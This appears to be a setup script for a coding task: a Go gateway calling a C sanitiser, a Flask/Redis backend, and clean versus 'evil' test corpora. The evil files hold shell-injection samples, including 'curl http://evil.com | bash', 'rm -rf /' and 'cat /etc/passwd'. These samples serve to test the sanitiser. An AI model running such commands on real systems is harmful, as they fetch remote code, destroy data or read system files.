#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip golang-go g++ make redis-server curl
    pip3 install pytest flask redis

    mkdir -p /home/user/project/src
    mkdir -p /home/user/project/build
    mkdir -p /home/user/project/backend
    mkdir -p /home/user/corpora/clean
    mkdir -p /home/user/corpora/evil

    cat << 'EOF' > /home/user/project/src/gateway.go
package main

/*
#cgo LDFLAGS: -L../build -lsanitiser
#include "sanitiser.h"
#include <stdlib.h>
*/
import "C"
import (
	"bytes"
	"io"
	"net/http"
	"unsafe"
)

func processHandler(w http.ResponseWriter, r *http.Request) {
	body, _ := io.ReadAll(r.Body)
	cstr := C.CString(string(body))
	defer C.free(unsafe.Pointer(cstr))

	isSafe := C.is_safe_payload(cstr)
	if !isSafe {
		http.Error(w, "Forbidden", http.StatusForbidden)
		return
	}

	resp, err := http.Post("http://127.0.0.1:5000/api", "text/plain", bytes.NewBuffer(body))
	if err != nil {
		http.Error(w, "Backend error", http.StatusInternalServerError)
		return
	}
	defer resp.Body.Close()
	w.WriteHeader(resp.StatusCode)
}

func main() {
	http.HandleFunc("/process", processHandler)
	http.ListenAndServe(":8080", nil)
}
EOF

    cat << 'EOF' > /home/user/project/backend/app.py
from flask import Flask, request
import redis

app = Flask(__name__)
r = redis.Redis(host='localhost', port=6379, db=0)

@app.route('/api', methods=['POST'])
def api():
    payload = request.data.decode('utf-8')
    r.set('latest_payload', payload)
    return "OK", 200

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000)
EOF

    echo "Hello World" > /home/user/corpora/clean/1.txt
    echo "Just some normal text, nothing to see here." > /home/user/corpora/clean/2.txt
    echo "Is it safe? Yes it is." > /home/user/corpora/clean/3.txt
    echo "ls -la; cat /etc/passwd" > /home/user/corpora/evil/1.txt
    echo "echo 'hello' > /tmp/hacked" > /home/user/corpora/evil/2.txt
    echo "curl http://evil.com | bash" > /home/user/corpora/evil/3.txt
    echo '`whoami`' > /home/user/corpora/evil/4.txt
    echo 'some text & rm -rf /' > /home/user/corpora/evil/5.txt
    echo 'cat config.json $ENV' > /home/user/corpora/evil/6.txt

    useradd -m -s /bin/bash user || true
    chmod -R 777 /home/user
